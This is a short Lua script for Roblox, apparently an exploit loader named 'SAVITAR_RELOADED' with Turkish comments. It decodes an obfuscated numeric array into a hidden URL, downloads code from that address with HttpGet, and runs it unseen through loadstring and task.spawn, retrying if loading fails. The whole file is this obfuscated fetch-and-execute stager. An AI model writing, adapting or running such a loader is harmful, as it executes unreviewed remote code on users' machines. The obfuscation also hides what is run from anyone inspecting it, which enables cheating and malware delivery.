local _1=string;local _2=table;local _3=game;local _4={114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}

local function _SOLVE(_D)
    local _R = ""
    for i = 1, #_D do
        local _K = (i % 8) + (math.floor(i / 10) % 5) + 8
        _R = _R .. _1.char(_D[i] - _K)
    end
    return _R
end

local function _SAFE_LOAD(_SOURCE)
    -- Loadstring'i burada modifiye ediyoruz
    local _CHUNK, _ERR = loadstring(_SOURCE, "SAVITAR_RELOADED")
    if _CHUNK then
        return task.spawn(_CHUNK)
    else
        -- Hata varsa bytecode temizliği yapıp tekrar dene
        local _CLEAN = _SOURCE:gsub("^%s*(.-)%s*$", "%1")
        local _FINAL = loadstring(_CLEAN)
        if _FINAL then task.spawn(_FINAL) end
    end
end

local function _INIT()
    local _U = _SOLVE(_4) .. "?v=" .. math.random(100, 999)
    local _S, _C = pcall(function() return _3:HttpGet(_U, true) end)
    
    if _S and _C and #_C > 0 then
        _SAFE_LOAD(_C)
    end
end

_INIT()
